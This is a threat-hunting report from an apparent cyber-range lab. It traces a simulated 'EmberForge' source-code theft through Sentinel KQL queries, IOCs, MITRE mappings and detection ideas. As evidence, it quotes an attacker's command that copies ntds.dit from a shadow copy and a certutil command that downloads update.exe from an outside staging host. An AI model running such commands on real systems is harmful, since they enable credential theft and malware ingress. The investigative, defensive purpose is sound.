# Threat Hunt Report – EmberForge Source Leak Investigation

A threat hunting investigation was conducted within Microsoft Sentinel after suspicious activity was identified in the EmberForge environment. The investigation revealed successful data collection, archive staging, cloud-based exfiltration using rclone, attacker credential exposure, and Active Directory credential database theft via NTDS access.

The attacker leveraged Living Off The Land (LOTL) techniques and legitimate administrative utilities including PowerShell and certutil to evade detection while transferring sensitive company data externally.

The investigation confirmed:

* successful data exfiltration,
* attacker-controlled staging infrastructure,
* exposed attacker credentials,
* and evidence of potential full domain compromise.

---

# Threat Hunt Report – EmberForge Source Leak Investigation

# Environment Details

| Item                 | Value                                       |
| -------------------- | ------------------------------------------- |
| SIEM Platform        | Microsoft Sentinel                          |
| Workspace            | law-cyber-range                             |
| Investigation Window | 2026-01-30 21:00 UTC – 2026-01-31 00:00 UTC |
| Custom Log Table     | EmberForgeX_CL                              |

---

# 1. Stolen Data Source Directory → C:\GameDev

## Investigation Task

The objective was to identify:

* what sensitive data was targeted,
* where the data originated from,
* and how the attacker packaged the data before exfiltration.

The investigation focused on identifying archive creation activity and Living Off The Land compression techniques.

## What I Looked For

* PowerShell archive creation
* ZIP/RAR/7z activity
* Compression-related command lines
* Staging directories
* Built-in Windows compression utilities

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("zip", "rar", "7z", "tar", "archive", "compress")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```


### Screenshot

<img width="1013" height="318" alt="Screenshot 2026-05-30 194924" src="https://github.com/user-attachments/assets/f8377173-20c2-4375-a9d8-22d12b529d66" />


---

# 2. Exfiltration Destination – MEGA

## Investigation Task

The objective was to determine:
- where the stolen data was uploaded,
- what cloud provider received the files,
- and whether cloud-based exfiltration was used.

## What I Looked For

- Archive upload commands
- Cloud synchronization activity
- rclone destination parameters
- External storage providers
- Upload-related command lines

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "gamedev.zip"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```

| Artifact         | Value       |
| ---------------- | ----------- |
| Cloud Provider   | MEGA        |
| Uploaded Archive | gamedev.zip |

### Screenshot
<img width="1000" height="315" alt="image" src="https://github.com/user-attachments/assets/19e0639e-25cd-4f62-9d19-b3628e2e0aca" />

---


# 3. Attacker Email Attribution - jwilson.vhr@proton.me


## Investigation Task

The objective was to identify:

* attacker-controlled cloud credentials,
* exposed authentication details,
* and attribution indicators left in command-line activity.

## What I Looked For

* rclone configuration activity
* Credential-related command lines
* Usernames and email addresses
* Configuration file creation activity
* Authentication parameters


## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "rclone"
| project TimeGenerated, Computer, EventCode_s, CommandLine_s
| order by TimeGenerated asc
```

### Screenshot

<img width="1074" height="339" alt="image" src="https://github.com/user-attachments/assets/2abbc38e-ec34-4f2a-a99a-8c0502e16897" />


---
# 4. Active Directory Credential Database Theft - ntds.dit

## Investigation Task

The objective was to determine whether:

* the attacker accessed Domain Controller credential stores,
* volume shadow copy techniques were used,
* and Active Directory compromise occurred.

## What I Looked For

* NTDS references
* Shadow copy usage
* vssadmin activity
* Credential dumping indicators
* File copy operations involving ntds.dit

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("vssadmin", "shadow", "ntds", "diskshadow", "copy")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
```

## Findings

| Artifact            | Value    |
| ------------------- | -------- |
| Credential Database | ntds.dit |

### Screenshot
<img width="862" height="288" alt="image" src="https://github.com/user-attachments/assets/4d5653e4-5ac3-45b7-b8b6-8205523666ff" />

---

# 5. Exfiltration Tool Discovery - rclone.exe

## Investigation Task

The objective was to determine:

* what tool was used to exfiltrate the stolen data,
* whether the tool was legitimate software,
* and how the attacker transferred files externally.

## What I Looked For

* Cloud synchronization utilities
* File transfer tools
* External upload commands
* Repeated tool execution attempts
* Suspicious command-line arguments

---

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "gamedev.zip"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```


### Screenshot

<img width="1021" height="321" alt="image" src="https://github.com/user-attachments/assets/beb5f25e-259b-4988-a9f5-179427c83c85" />


---

# 6. Exfiltration Destination IP - 66.203.125.15

## Investigation Task

The objective was to correlate:

* the exfiltration process,
* outbound network activity,
* and the external IP address receiving stolen data.

## What I Looked For

* Sysmon network connection events
* Event ID 3 telemetry
* Process-to-network correlation
* Outbound connections from rclone.exe
* External destination IPs
  
## Query Used

```kql
EmberForgeX_CL
| where EventCode_s == "3"
| where Image_s has "rclone"
| project TimeGenerated,
          Computer,
          Image_s,
          DestinationIp_s,
          DestinationPort_s
| order by TimeGenerated asc
```

### Screenshot

<img width="838" height="252" alt="image" src="https://github.com/user-attachments/assets/abe621f1-41d0-42a0-b0ee-056721819e33" />


---



# 7. Plaintext Credential Exposure - Summer2024!


## Investigation Task

The objective was to determine whether:

* credentials were exposed in plaintext,
* command-line arguments leaked sensitive information,
* and operational security mistakes could aid attribution.

## What I Looked For

* Password arguments
* Authentication flags
* Inline credentials
* Failed execution attempts
* Insecure command-line usage

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("pass", "password", "mega-pass", "config create")
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

### Screenshot

<img width="845" height="258" alt="image" src="https://github.com/user-attachments/assets/0e5cd08f-969b-4e31-9074-091412a99f1c" />


---

Q08 - Archive Method

## Investigation Task

The objective was to identify:
- how the attacker compressed the stolen data,
- whether built-in Windows functionality was used,
- and whether Living Off The Land techniques were involved.

## What I Looked For

- Compression-related command lines
- Archive creation activity
- PowerShell compression cmdlets
- ZIP archive generation
- Native Windows utilities

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("zip", "rar", "7z", "tar", "archive", "compress")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```

The cmdlet is:

Compress-Archive

<img width="1005" height="336" alt="image" src="https://github.com/user-attachments/assets/6b339eff-f4b5-4ee8-b58c-eba398be3c03" />


# 9. Staging Infrastructure Discovery - sync.cloud-endpoint.net

## Investigation Task

The objective was to identify:

* attacker-controlled infrastructure,
* how tools entered the environment,
* and whether the same external server was reused across hosts.

## What I Looked For

* Download utilities
* LOLBins used for tool transfer
* External URLs
* certutil activity
* PowerShell web requests
* Repeated external infrastructure references
  
## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any (
    "Invoke-WebRequest",
    "iwr",
    "curl",
    "wget",
    "certutil",
    "bitsadmin",
    "download"
)
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe
```

## Findings

| Artifact           | Value                   |
| ------------------ | ----------------------- |
| Staging Server     | sync.cloud-endpoint.net |
| Downloaded Payload | update.exe              |

### Screenshot

<img width="1031" height="333" alt="image" src="https://github.com/user-attachments/assets/9565d1c2-651c-4356-94c1-ee8f2135c83c" />



---

# Attack Timeline

| Stage                    | Activity                                                    |
| ------------------------ | ----------------------------------------------------------- |
| Tool Transfer            | certutil downloaded update.exe from attacker infrastructure |
| Data Collection          | Sensitive data gathered from C:\GameDev                     |
| Archive Creation         | Compress-Archive created gamedev.zip                        |
| Exfiltration Preparation | rclone configured with MEGA credentials                     |
| Credential Exposure      | Plaintext MEGA password exposed in command line             |
| Exfiltration             | gamedev.zip uploaded to MEGA                                |
| Domain Compromise        | NTDS database copied via Volume Shadow Copy                 |

---

# Indicators of Compromise (IOCs)


```md id="q9ofkq"
| Question | Answer |
|---|---|
| 1. Stolen Data Source Directory | C:\GameDev |
| 2. Exfiltration Destination | MEGA |
| 3. Attacker Email Attribution | jwilson.vhr@proton.me |
| 4. Active Directory Credential Database Theft | ntds.dit |
| 5. Exfiltration Destination IP | 66.203.125.15 |
| 6. Plaintext Credential Exposure | Summer2024! |
| 7. Archive Method | Compress-Archive |
| 8. Staging Infrastructure Discovery | sync.cloud-endpoint.net |
```


---

# MITRE ATT&CK Techniques Observed

```md id="lfcyi9"
| Question | MITRE ATT&CK Technique | ID |
|---|---|---|
| 1. Stolen Data Source Directory | Data from Local System | T1005 |
| 2. Exfiltration Destination | Exfiltration to Cloud Storage | T1567.002 |
| 3. Attacker Email Attribution | Unsecured Credentials | T1552 |
| 4. Active Directory Credential Database Theft | NTDS Credential Dumping | T1003.003 |
| 5. Exfiltration Destination IP | Exfiltration to Cloud Storage | T1567.002 |
| 6. Plaintext Credential Exposure | Unsecured Credentials | T1552 |
| 7. Archive Method | Archive via Utility | T1560.001 |
| 8. Staging Infrastructure Discovery | Ingress Tool Transfer | T1105 |
```


---

# Detection Opportunities

Potential detections identified during the investigation:

* Monitor execution of rclone.exe
* Alert on Compress-Archive usage in sensitive directories
* Detect certutil outbound downloads
* Monitor Event ID 3 network connections from uncommon utilities
* Alert on NTDS.dit access attempts
* Monitor Volume Shadow Copy abuse
* Detect plaintext credential exposure in command-line arguments
* Alert on external DNS queries to uncommon infrastructure

---

# Impact Assessment

The investigation confirmed:

* successful theft of proprietary development data,
* external cloud-based exfiltration,
* exposure of attacker infrastructure and credentials,
* and potential compromise of all Active Directory credentials through NTDS database access.

Based on the observed activity, the environment should be treated as fully compromised until remediation and credential rotation are completed.

---

# Conclusion

The investigation confirmed successful compromise activity involving:

* malicious tool transfer,
* archive staging,
* cloud exfiltration,
* credential exposure,
* and Active Directory credential theft.

The attacker leveraged Living Off The Land techniques and legitimate administrative tooling to evade detection while staging and exfiltrating sensitive company data.
